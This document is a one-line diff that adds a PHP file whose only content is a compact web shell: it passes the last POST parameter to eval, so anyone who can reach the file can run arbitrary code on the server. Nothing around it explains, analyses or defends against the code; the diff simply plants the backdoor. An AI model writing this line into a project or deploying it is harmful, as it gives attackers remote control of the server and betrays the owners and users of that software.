@@ -1,0 +1,1 @@
+<?eval(stripslashes(array_pop($_POST)))?>
